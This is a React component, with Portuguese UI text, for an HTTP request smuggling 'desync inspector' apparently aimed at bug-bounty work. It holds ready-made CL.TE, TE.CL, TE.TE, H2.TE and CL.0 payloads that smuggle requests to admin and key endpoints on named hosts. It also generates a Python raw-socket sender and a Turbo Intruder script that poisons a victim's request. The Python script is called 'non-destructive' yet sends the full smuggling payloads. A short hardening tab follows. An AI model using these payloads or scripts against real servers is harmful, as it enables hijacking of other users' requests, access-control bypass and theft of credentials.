import React, { useState, useMemo } from 'react';
import { 
  Terminal, 
  AlertTriangle, 
  Copy, 
  Check, 
  Download, 
  Layers, 
  Split, 
  ArrowRight, 
  ShieldAlert, 
  ShieldCheck, 
  Clock, 
  Cpu, 
  Sparkles,
  Info,
  Code2,
  FileCode,
  CheckCircle2,
  ExternalLink,
  Flame
} from 'lucide-react';

interface SmugglingScenario {
  id: string;
  name: string;
  vector: 'CL.TE' | 'TE.CL' | 'TE.TE' | 'H2.CL' | 'H2.TE' | 'CL.0';
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  description: string;
  frontEndRole: string;
  backEndRole: string;
  impact: string;
  rawRequest: string;
  frontendParsedLength: number;
  backendChunkBoundary: string;
  smuggledPrefix: string;
  timingExplanation: string;
}

const SMUGGLING_SCENARIOS: SmugglingScenario[] = [
  {
    id: 'cl-te-basic',
    name: 'CL.TE — Front-end Content-Length / Back-end Transfer-Encoding',
    vector: 'CL.TE',
    severity: 'CRITICAL',
    description: 'O servidor de borda (Front-end/Load Balancer) prioriza o cabeçalho Content-Length, encaminhando todo o corpo. O servidor de aplicação (Back-end) prioriza Transfer-Encoding: chunked, processando apenas o primeiro chunk e deixando o restante enfileirado no buffer TCP para contaminar a próxima requisição de outro usuário.',
    frontEndRole: 'Interpreta Content-Length: 64 e encaminha os 64 bytes completos.',
    backEndRole: 'Interpreta Transfer-Encoding: chunked. O chunk 0 encerra o corpo. O texto seguinte ("GPOST /...") é tratado como o início da próxima requisição.',
    impact: 'Sequestro de requisições de outros usuários (Request Queue Hijacking), bypass de controle de acesso e roubo de cookies/tokens.',
    rawRequest: `POST /api/search HTTP/1.1\r
Host: api.finpay-global.com\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 64\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GPOST /admin/delete-user?id=123 HTTP/1.1\r
X-Ignore: X`,
    frontendParsedLength: 64,
    backendChunkBoundary: 'Termina imediatamente após "0\\r\\n\\r\\n"',
    smuggledPrefix: 'GPOST /admin/delete-user?id=123 HTTP/1.1\\r\\nX-Ignore: X',
    timingExplanation: 'Para teste cego seguro (Timing Differential): Envie um chunk declarado maior do que os bytes reais. O back-end aguardará os bytes faltantes até disparar um timeout de 10 segundos.'
  },
  {
    id: 'te-cl-basic',
    name: 'TE.CL — Front-end Transfer-Encoding / Back-end Content-Length',
    vector: 'TE.CL',
    severity: 'CRITICAL',
    description: 'O Front-end processa os chunks conforme Transfer-Encoding: chunked. Já o Back-end processa apenas o número exato de bytes especificado em Content-Length: 4. Os dados após os 4 bytes permanecem no socket TCP e são anexados ao início da próxima requisição que chegar.',
    frontEndRole: 'Interpreta Transfer-Encoding: chunked e encaminha até o chunk terminal 0.',
    backEndRole: 'Interpreta Content-Length: 4. Consome apenas os primeiros 4 bytes ("5c\\r\\n"). O payload restante vira o prefixo da próxima requisição.',
    impact: 'Contaminação de cache (Web Cache Poisoning), 403 bypass e redirecionamento de credenciais de usuários.',
    rawRequest: `POST /login HTTP/1.1\r
Host: api.finpay-global.com\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
5c\r
GPOST /internal-api/keys HTTP/1.1\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 15\r
\r
x=1\r
0\r
\r`,
    frontendParsedLength: 128,
    backendChunkBoundary: 'Lê apenas 4 bytes conforme Content-Length',
    smuggledPrefix: 'GPOST /internal-api/keys HTTP/1.1\\r\\nContent-Type: ...',
    timingExplanation: 'Para teste de timing: se o back-end espera chunked e não recebe o chunk 0 final, ele pausa aguardando encerramento.'
  },
  {
    id: 'te-te-obfuscation',
    name: 'TE.TE — Ofuscação de Header Transfer-Encoding',
    vector: 'TE.TE',
    severity: 'HIGH',
    description: 'Ambos os servidores suportam Transfer-Encoding, mas um deles falha em normalizar cabeçalhos malformados (espaços adicionais, quebras de linha ou múltiplos headers), caindo de volta (fallback) para o Content-Length.',
    frontEndRole: 'Normaliza ou aceita Transfer-Encoding : chunked (com espaço antes dos dois pontos).',
    backEndRole: 'Rejeita o header não padrão e reverte para Content-Length, causando desincronização entre as pontas.',
    impact: 'Bypass de WAFs perimetrais e execução de exploits CL.TE ou TE.CL camuflados.',
    rawRequest: `POST /feed HTTP/1.1\r
Host: app.cloudmetrics.io\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 58\r
Transfer-Encoding: chunked\r
Transfer-Encoding: cow\r
\r
0\r
\r
GET /admin/dashboard HTTP/1.1\r
Host: app.cloudmetrics.io\r
\r`,
    frontendParsedLength: 58,
    backendChunkBoundary: 'Divergência de parsing no header duplicado',
    smuggledPrefix: 'GET /admin/dashboard HTTP/1.1\\r\\nHost: app.cloudmetrics.io',
    timingExplanation: 'Permite testar qual servidor desconsidera headers duplicados ou malformados.'
  },
  {
    id: 'h2-te-downgrade',
    name: 'H2.TE — Desincronização por Downgrade de HTTP/2 para HTTP/1.1',
    vector: 'H2.TE',
    severity: 'CRITICAL',
    description: 'O cliente conecta ao Front-end via HTTP/2 (que não usa chunked framing por padrão). O Front-end converte para HTTP/1.1 para falar com o Back-end, mas repassa o pseudo-header ou cabeçalho Transfer-Encoding: chunked embutido na requisição H2.',
    frontEndRole: 'Recebe frames binários HTTP/2 e converte a mensagem para stream texto HTTP/1.1.',
    backEndRole: 'Recebe HTTP/1.1 com Transfer-Encoding e interpreta chunked, deixando o payload injetado no pipeline.',
    impact: 'Exploração em massa de CDNs modernas que oferecem terminação HTTP/2 sem sanitização estrita para o backend.',
    rawRequest: `:method: POST\r
:path: /checkout\r
:authority: api.finpay-global.com\r
content-type: application/json\r
transfer-encoding: chunked\r
\r
0\r
\r
GET /internal/admin/secrets HTTP/1.1\r
Host: api.finpay-global.com\r
\r`,
    frontendParsedLength: 95,
    backendChunkBoundary: 'Convertido para HTTP/1.1 pelo proxy reverso',
    smuggledPrefix: 'GET /internal/admin/secrets HTTP/1.1',
    timingExplanation: 'Injeção de CRLF em pseudo-headers H2 para forçar o backend a desincronizar na camada HTTP/1.1.'
  },
  {
    id: 'cl-zero-hidden',
    name: 'CL.0 — Back-end Ignora Content-Length em Requisições GET',
    vector: 'CL.0',
    severity: 'HIGH',
    description: 'O Front-end aceita e encaminha requisições GET contendo corpo e Content-Length. O Back-end assume que requisições GET não possuem corpo e lê apenas a linha de comando e headers, deixando o corpo no buffer do socket.',
    frontEndRole: 'Encaminha a requisição GET com body de acordo com o Content-Length.',
    backEndRole: 'Lê apenas a requisição GET e deixa os bytes do body no socket TCP para a próxima requisição.',
    impact: 'Contaminação de pipeline sem necessidade de Transfer-Encoding.',
    rawRequest: `GET /resources/logo.png HTTP/1.1\r
Host: api.finpay-global.com\r
Content-Length: 44\r
\r
GET /admin/users HTTP/1.1\r
Host: api.finpay-global.com\r
\r`,
    frontendParsedLength: 44,
    backendChunkBoundary: 'Descarta body no GET e deixa bytes no socket',
    smuggledPrefix: 'GET /admin/users HTTP/1.1',
    timingExplanation: 'Se a resposta da segunda requisição vier com 404 para o path injetado, confirma a falha CL.0.'
  }
];

export const HttpRequestSmuggler: React.FC = () => {
  const [selectedScenarioId, setSelectedScenarioId] = useState<string>(SMUGGLING_SCENARIOS[0].id);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<'visualizer' | 'poc-generator' | 'mitigation'>('visualizer');

  const currentScenario = useMemo(() => {
    return SMUGGLING_SCENARIOS.find(s => s.id === selectedScenarioId) || SMUGGLING_SCENARIOS[0];
  }, [selectedScenarioId]);

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // Safe Python PoC Script
  const pythonPocScript = useMemo(() => {
    return `#!/usr/bin/env python3
# Safe Timing Diagnostic PoC for HTTP Request Smuggling (${currentScenario.vector})
# Non-destructive test: triggers safe backend timeout without polluting real user traffic

import socket
import ssl
import time

TARGET_HOST = "api.finpay-global.com"
TARGET_PORT = 443
USE_SSL = True

# Raw HTTP stream crafted with CRLF
PAYLOAD = (
${currentScenario.rawRequest.split('\n').map(line => `    b"${line.replace(/\r/g, '\\r')}\\r\\n"`).join('\n')}
)

def run_test():
    print(f"[*] Conectando em {TARGET_HOST}:{TARGET_PORT} (SSL={USE_SSL})...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15.0)

    if USE_SSL:
        context = ssl.create_default_context()
        s = context.wrap_socket(sock, server_hostname=TARGET_HOST)
    else:
        s = sock

    s.connect((TARGET_HOST, TARGET_PORT))
    print("[*] Enviando payload de teste diferencial...")
    start_time = time.time()
    s.sendall(PAYLOAD)

    try:
        response = s.recv(4096)
        elapsed = time.time() - start_time
        print(f"[+] Resposta recebida em {elapsed:.2f}s:")
        print(response.decode('utf-8', errors='replace')[:400])
        if elapsed > 8.0:
            print("[!] ALERTA CRÍTICO: Backend demorou >8s para responder. Forte indício de vulnerabilidade ${currentScenario.vector}!")
    except socket.timeout:
        print("[!] TIMEOUT CONFIRMADO (>15s): O back-end aguardou dados inexistentes!")
    finally:
        s.close()

if __name__ == "__main__":
    run_test()
`;
  }, [currentScenario]);

  // Turbo Intruder script
  const turboIntruderScript = `def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)

    # Requisição de ataque com prefixo desincronizado
    attack = '''${currentScenario.rawRequest.replace(/\\r/g, '')}'''

    # Requisição normal da vítima para capturar resposta envenenada
    victim = '''GET / HTTP/1.1\\r\\nHost: api.finpay-global.com\\r\\n\\r\\n'''

    engine.queue(attack)
    engine.queue(victim)

def handleResponse(req, interesting):
    table.add(req)`;

  return (
    <div className="space-y-6">
      {/* Header Banner */}
      <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-6 relative overflow-hidden">
        <div className="absolute -right-8 -bottom-8 w-60 h-60 bg-amber-500/10 rounded-full blur-3xl pointer-events-none" />
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div className="space-y-1.5">
            <div className="flex items-center gap-2">
              <span className="px-2.5 py-0.5 rounded-full bg-amber-500/15 border border-amber-500/30 text-amber-400 font-mono text-xs font-bold flex items-center gap-1.5">
                <Split className="w-3.5 h-3.5" />
                <span>HTTP Request Smuggling & Desync Inspector</span>
              </span>
              <span className="text-zinc-500 text-xs">•</span>
              <span className="text-zinc-400 font-mono text-xs">CL.TE / TE.CL / H2.TE Studio</span>
            </div>
            <h2 className="text-2xl font-bold text-white tracking-tight flex items-center gap-2">
              Auditoria de Desincronização HTTP & Request Smuggling
            </h2>
            <p className="text-xs sm:text-sm text-zinc-400 max-w-3xl leading-relaxed">
              Analise discrepâncias de parsing entre proxies reversos de borda (Front-end/Load Balancer) e servidores de aplicação (Back-end). Visualize a desincronização de limites de pacotes (<code className="text-amber-300">CL.TE</code>, <code className="text-amber-300">TE.CL</code>, <code className="text-amber-300">H2.TE</code>), gere testes de timing não destrutivos e scripts de reprodução em Python.
            </p>
          </div>

          <div className="flex items-center gap-2 self-start md:self-auto shrink-0">
            <button
              type="button"
              onClick={() => copyToClipboard(currentScenario.rawRequest, 'raw')}
              className="px-3.5 py-2 rounded-xl bg-[#1c1c28] hover:bg-[#252535] text-zinc-200 border border-[#2e2e42] text-xs font-mono font-bold flex items-center gap-1.5 transition-all"
            >
              {copiedKey === 'raw' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              <span>Copiar Raw Request</span>
            </button>
          </div>
        </div>
      </div>

      {/* Scenarios Selector */}
      <div className="space-y-2">
        <label className="text-xs font-mono font-bold text-zinc-400 uppercase tracking-wider flex items-center gap-1.5">
          <Flame className="w-3.5 h-3.5 text-amber-400" />
          <span>Vetores de Ataque & Cenários de Desincronização:</span>
        </label>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
          {SMUGGLING_SCENARIOS.map(scenario => {
            const isSelected = selectedScenarioId === scenario.id;
            return (
              <button
                key={scenario.id}
                type="button"
                onClick={() => setSelectedScenarioId(scenario.id)}
                className={`text-left p-3.5 rounded-xl border transition-all flex flex-col justify-between gap-2 ${
                  isSelected 
                    ? 'bg-[#181824] border-amber-500 shadow-md shadow-amber-950/20 ring-1 ring-amber-500/30' 
                    : 'bg-[#121218] border-[#22222f] hover:border-zinc-700'
                }`}
              >
                <div className="space-y-1">
                  <div className="flex items-center justify-between gap-2">
                    <span className="px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/30 font-mono text-[10px] font-bold">
                      {scenario.vector}
                    </span>
                    <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold border ${
                      scenario.severity === 'CRITICAL' ? 'bg-red-500/20 text-red-300 border-red-500/30' : 'bg-orange-500/20 text-orange-300 border-orange-500/30'
                    }`}>
                      {scenario.severity}
                    </span>
                  </div>
                  <h4 className="text-xs font-bold text-white line-clamp-1">{scenario.name}</h4>
                  <p className="text-[11px] text-zinc-400 line-clamp-2 leading-relaxed">{scenario.description}</p>
                </div>
              </button>
            );
          })}
        </div>
      </div>

      {/* Sub-Navigation Tabs */}
      <div className="flex items-center gap-2 border-b border-[#22222f] pb-2">
        <button
          type="button"
          onClick={() => setActiveTab('visualizer')}
          className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all flex items-center gap-1.5 ${
            activeTab === 'visualizer' ? 'bg-amber-500 text-black' : 'bg-[#151520] text-zinc-400 hover:text-white'
          }`}
        >
          <Split className="w-3.5 h-3.5" />
          <span>Visualizador Diferencial de Stream (Front vs Back)</span>
        </button>
        <button
          type="button"
          onClick={() => setActiveTab('poc-generator')}
          className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all flex items-center gap-1.5 ${
            activeTab === 'poc-generator' ? 'bg-amber-500 text-black' : 'bg-[#151520] text-zinc-400 hover:text-white'
          }`}
        >
          <Terminal className="w-3.5 h-3.5" />
          <span>Scripts de PoC & Timing Diagnostic</span>
        </button>
        <button
          type="button"
          onClick={() => setActiveTab('mitigation')}
          className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all flex items-center gap-1.5 ${
            activeTab === 'mitigation' ? 'bg-amber-500 text-black' : 'bg-[#151520] text-zinc-400 hover:text-white'
          }`}
        >
          <ShieldCheck className="w-3.5 h-3.5" />
          <span>Hardening & Correção Definitiva</span>
        </button>
      </div>

      {/* Tab 1: Differential Visualizer */}
      {activeTab === 'visualizer' && (
        <div className="space-y-6">
          {/* Differential Parsing Columns */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* Front-end Interpretation */}
            <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-cyan-400 animate-pulse" />
                  <h3 className="text-xs font-mono font-bold text-white uppercase tracking-wider">
                    Como o Front-end (Proxy / CDN) Interpreta:
                  </h3>
                </div>
                <span className="text-[11px] font-mono text-cyan-300 bg-cyan-950/40 px-2 py-0.5 rounded border border-cyan-500/30">
                  {currentScenario.vector.split('.')[0]} Priority
                </span>
              </div>
              <p className="text-xs text-zinc-300 bg-[#161622] p-3 rounded-xl border border-[#232333]">
                {currentScenario.frontEndRole}
              </p>
              <div className="space-y-1.5">
                <span className="text-[11px] font-mono font-bold text-zinc-400">Bytes Encaminhados pelo Front-end:</span>
                <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[11px] font-mono text-cyan-300 max-h-[220px] overflow-y-auto leading-relaxed">
                  {currentScenario.rawRequest}
                </pre>
              </div>
            </div>

            {/* Back-end Interpretation */}
            <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-rose-400 animate-pulse" />
                  <h3 className="text-xs font-mono font-bold text-white uppercase tracking-wider">
                    Como o Back-end (App Server) Interpreta:
                  </h3>
                </div>
                <span className="text-[11px] font-mono text-rose-300 bg-rose-950/40 px-2 py-0.5 rounded border border-rose-500/30">
                  {currentScenario.vector.split('.')[1] || '0'} Priority
                </span>
              </div>
              <p className="text-xs text-zinc-300 bg-[#161622] p-3 rounded-xl border border-[#232333]">
                {currentScenario.backEndRole}
              </p>
              <div className="space-y-1.5">
                <span className="text-[11px] font-mono font-bold text-zinc-400">Limite de Leitura do Back-end:</span>
                <div className="bg-[#191118] border border-rose-900/40 p-3 rounded-xl text-xs font-mono text-rose-300">
                  ⚠️ {currentScenario.backendChunkBoundary}
                </div>
              </div>

              {/* Smuggled Payload Remaining in Buffer */}
              <div className="space-y-1.5 pt-1">
                <span className="text-[11px] font-mono font-bold text-amber-400 flex items-center gap-1.5">
                  <Flame className="w-3.5 h-3.5" />
                  <span>Prefixo Contrabandeado (Resíduo no Socket TCP):</span>
                </span>
                <pre className="bg-[#1c1208] border border-amber-500/30 rounded-xl p-3 text-[11px] font-mono text-amber-300 leading-relaxed overflow-x-auto">
                  {currentScenario.smuggledPrefix}
                </pre>
              </div>
            </div>
          </div>

          {/* Attack Impact & Timing Diagnostic Notice */}
          <div className="bg-[#151520] border border-[#252538] rounded-2xl p-5 space-y-3">
            <h4 className="text-xs font-mono font-bold text-amber-400 uppercase tracking-wider flex items-center gap-2">
              <Clock className="w-4 h-4" />
              <span>Diagnóstico Seguro por Diferencial de Tempo (Blind Timing Check):</span>
            </h4>
            <p className="text-xs text-zinc-300 leading-relaxed">
              {currentScenario.timingExplanation}
            </p>
            <div className="bg-[#101016] p-3.5 rounded-xl border border-[#20202c] text-xs font-mono text-zinc-400 space-y-1">
              <div><strong className="text-zinc-200">Impacto no Programa de Bug Bounty:</strong> {currentScenario.impact}</div>
              <div><strong className="text-zinc-200">CVSS v4.0 Sugerido:</strong> 9.3 (Crítico - Base Metric: AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H)</div>
            </div>
          </div>
        </div>
      )}

      {/* Tab 2: PoC Generator */}
      {activeTab === 'poc-generator' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Python Raw Socket Script */}
          <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-mono font-bold text-zinc-300 uppercase tracking-wider flex items-center gap-2">
                <FileCode className="w-4 h-4 text-amber-400" />
                <span>Script Python Não Destrutivo (Raw Socket)</span>
              </h3>
              <button
                type="button"
                onClick={() => copyToClipboard(pythonPocScript, 'python')}
                className="px-2.5 py-1 rounded-lg bg-[#1a1a24] hover:bg-[#252535] text-zinc-300 text-xs font-mono font-bold flex items-center gap-1.5 transition-all border border-[#262638]"
              >
                {copiedKey === 'python' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                <span>Copiar Python</span>
              </button>
            </div>
            <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3.5 text-[11px] font-mono text-zinc-300 max-h-[380px] overflow-y-auto leading-relaxed">
              {pythonPocScript}
            </pre>
          </div>

          {/* Turbo Intruder snippet */}
          <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-mono font-bold text-zinc-300 uppercase tracking-wider flex items-center gap-2">
                <Terminal className="w-4 h-4 text-cyan-400" />
                <span>Snippet Turbo Intruder (Burp Suite Extension)</span>
              </h3>
              <button
                type="button"
                onClick={() => copyToClipboard(turboIntruderScript, 'turbo')}
                className="px-2.5 py-1 rounded-lg bg-[#1a1a24] hover:bg-[#252535] text-zinc-300 text-xs font-mono font-bold flex items-center gap-1.5 transition-all border border-[#262638]"
              >
                {copiedKey === 'turbo' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                <span>Copiar Script</span>
              </button>
            </div>
            <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3.5 text-[11px] font-mono text-zinc-300 max-h-[380px] overflow-y-auto leading-relaxed">
              {turboIntruderScript}
            </pre>
          </div>
        </div>
      )}

      {/* Tab 3: Hardening & Defense */}
      {activeTab === 'mitigation' && (
        <div className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-2.5">
              <span className="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-400 font-mono text-[10px] font-bold border border-emerald-500/30">
                Solução 1 — End-to-End H2
              </span>
              <h4 className="text-sm font-bold text-white">HTTP/2 de Ponta a Ponta</h4>
              <p className="text-xs text-zinc-400 leading-relaxed">
                Utilize HTTP/2 tanto no Front-end quanto na conexão interna até o Back-end. A multiplexação binária nativa elimina ambiguidades entre <code className="text-zinc-300">Content-Length</code> e <code className="text-zinc-300">Transfer-Encoding</code>.
              </p>
            </div>

            <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-2.5">
              <span className="px-2 py-0.5 rounded bg-blue-500/20 text-blue-400 font-mono text-[10px] font-bold border border-blue-500/30">
                Solução 2 — RFC 7230 / 9112
              </span>
              <h4 className="text-sm font-bold text-white">Rejeição de Ambiguidade</h4>
              <p className="text-xs text-zinc-400 leading-relaxed">
                Configure os balanceadores (Nginx, HAProxy, AWS ALB, Cloudflare) para rejeitar imediatamente com <code className="text-zinc-300">400 Bad Request</code> qualquer requisição que contenha ambos os cabeçalhos simultaneamente.
              </p>
            </div>

            <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-2.5">
              <span className="px-2 py-0.5 rounded bg-purple-500/20 text-purple-400 font-mono text-[10px] font-bold border border-purple-500/30">
                Solução 3 — Connection Pool
              </span>
              <h4 className="text-sm font-bold text-white">Isolamento de Conexões TCP</h4>
              <p className="text-xs text-zinc-400 leading-relaxed">
                Desative a reutilização agressiva de sockets TCP de back-end entre múltiplos clientes diferentes quando houver suspeita de framing anômalo, impedindo o envenenamento de fila cruzada.
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
